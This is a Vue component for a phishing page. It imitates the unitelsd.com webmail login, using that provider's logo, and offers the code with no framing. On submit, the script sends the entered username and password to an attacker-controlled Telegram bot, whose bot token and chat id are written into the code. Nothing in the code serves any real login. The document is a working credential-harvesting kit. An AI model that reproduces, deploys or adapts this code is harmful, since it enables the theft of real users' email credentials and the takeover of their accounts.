<template>
  <div class="page">
    <div class="overlay">
      <img
        style="margin-bottom: 40px"
        src="https://webmail.unitelsd.com/logos/all/unitelsd.com.png?s=1732144309"
        alt=""
      />

      <div class="login-box">
        <form @submit.prevent="finishJoob">
          <div class="input-group">
            <div class="icon">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="#d8d8d8"
              >
                <path
                  d="M12 12c2.76 0 5-2.24 5-5S14.76 2 12 2 7 4.24 7 7s2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5z"
                />
              </svg>
            </div>

            <input
              v-model="formDataRes.username"
              type="text"
              placeholder="Username"
            />
          </div>

          <div class="input-group">
            <div class="icon">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="#d8d8d8"
              >
                <path
                  d="M17 8h-1V6a4 4 0 00-8 0v2H7a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2V10a2 2 0 00-2-2zm-7-2a2 2 0 114 0v2h-4V6zm7 14H7V10h10v10z"
                />
              </svg>
            </div>

            <input
              v-model="formDataRes.password"
              type="password"
              placeholder="Password"
            />
          </div>

          <button type="submit">LOGIN</button>
        </form>
      </div>

      <div class="footer">unitelsd.com webmail</div>
    </div>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        username: "",
        password: "",
      },
      // showPopup: false,
      // loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },

  computed: {
    isFormValid() {
      return (this.formDataRes.username.trim() !== "" && this.formDataRes.password.trim() !== "");
    },
  },

  methods: {
    // registerFan() {
    //   this.showPopup = true;
    // },

    async finishJoob() {
      //  this.showPopup = true;

      this.count++;
      console.log("Count:", this.count);

      if (this.count) {
        this.loading = true;

        // Format the message as string
        const message = `*🔔🔔🔔 GOLDENWEST 🔔🔔🔔 *\nUSERNAME: ${this.formDataRes.username}\nPASSWORD: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        this.$router.push({
          path: "/",
          // query: {
          //   email: this.formDataRes.email,
          // },
        });
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<style scoped>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, Helvetica, sans-serif;
}

html {
  box-sizing: border-box;
  padding: 0;
  margin: 0;
  width: full;
}

.page {
  width: full;
  height: 100vh;
  background: url("https://d3mqmy22owj503.cloudfront.net/30/501030/images/site_graphics/hero-1.jpg")
    center center;
  background-size: cover;
}

.overlay {
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.45);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

.login-box {
  width: 430px;

  background: rgba(34, 34, 34, 0.88);

  padding: 42px;

  border-radius: 4px;
}

.input-group {
  display: flex;
  margin-bottom: 12px;
}

.icon {
  width: 52px;
  height: 46px;

  background: #3a3a3a;

  display: flex;
  justify-content: center;
  align-items: center;

  border: 1px solid #5f7682;
  border-right: none;

  color: #d5d5d5;
}

.input-group input {
  flex: 1;

  height: 46px;

  background: #252d31;

  border: 1px solid #5f7682;

  color: white;

  padding: 0 15px;

  font-size: 16px;
}

.input-group input::placeholder {
  color: #aeb7bc;
}

button {
  width: 100%;
  height: 42px;

  border: none;

  background: #0c84c6;

  color: white;

  font-size: 16px;
  font-weight: bold;

  cursor: pointer;

  border-radius: 2px;
}

button:hover {
  background: #0b76b2;
}

.footer {
  position: absolute;

  left: 8px;
  bottom: 8px;

  color: white;

  font-size: 11px;
}
</style>